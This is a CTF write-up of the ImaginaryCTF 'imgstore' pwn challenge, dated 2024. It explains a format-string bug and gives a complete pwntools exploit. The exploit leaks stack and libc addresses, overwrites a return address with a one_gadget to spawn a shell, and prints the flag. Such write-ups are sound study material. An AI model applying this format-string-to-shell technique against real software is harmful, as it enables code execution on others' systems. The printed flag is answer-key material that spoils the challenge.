https://ctftime.org/event/2396

# imgstore (pwn)

Back to the old school.

https://cybersharing.net/s/9325732cdfe6a6ab

nc imgstore.chal.imaginaryctf.org 1337

## Analysis

There is a lot of random code in this binary and I think that maybe there are a few vulns tucked away there but I focused on the most clearly exploitable aspect of the program in `sell_book`.

`sell_book` @ `0x1e2a`:
- Attacker controlled `printf(local_58);`

## Solution

1) Use `pwninit` to make an easily debuggable version of `imgstore` here called `imgstore_patched`
2) Leak an address on the stack and an address in libc
3) Offset the address on the stack to be the address of the return to libc
4) Use `printf` to perform a write to the libc return address on the stack so that we return to a `one_gadget` instead.

Here is the output of `one_gadget`:

```bash
$ one_gadget ./libc.so.6 
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

I chose to use the send one, namely `0xe3b01`, in the list.

The stack and libc offsets, namely `+ 10040` and `- 0x0024083`, were found by comparing stack addresses with `pwndbg` and looking at the provided `libc.so.6` in `ghidra` respectively.

I had quite some trouble getting a clean 8 byte write with `printf`, I think because the format string is a bit small, so after I figured out that I could perform one or two byte writes somewhat reliably I opted to partially rewrite the lowest three bytes of the libc return address in two stages.

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./imgstore_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("imgstore.chal.imaginaryctf.org", 1337)

p.sendlineafter(b">> ", b"3")

p.sendlineafter(b"Enter book title: ", b"%p.%p.%25$p")

p.readuntil(b"--> ")

leaks = p.readline().decode().split(".")
stack_leak = int(leaks[0], 16) + 10040

libc_leak = int(leaks[2], 16)
libc.address = libc_leak - 0x0024083

# perform a partial rewrite of a libc return address in two stages
one_gadget = libc.address + 0xe3b01

p.sendlineafter(b"[y/n]: ", b"y") # first byte only
p.readuntil(b"Enter book title: ")
p.sendline(fmtstr_payload(8, {stack_leak: p8(one_gadget & 0xff)}))

p.sendlineafter(b"[y/n]: ", b"y") # bytes two and three next
p.readuntil(b"Enter book title: ")
p.sendline(fmtstr_payload(8, {stack_leak+1: p16(((one_gadget) >> 8) & 0xffff)}))

p.sendlineafter(b"[y/n]: ", b"n") # ret2one_gadget

p.sendline( b"/bin/cat flag.txt")
 
p.interactive() # ictf{b4byy_f3rM4T_5Tr1nn66S}
```

## Flag
`ictf{b4byy_f3rM4T_5Tr1nn66S}`

smiley 2024/07/21
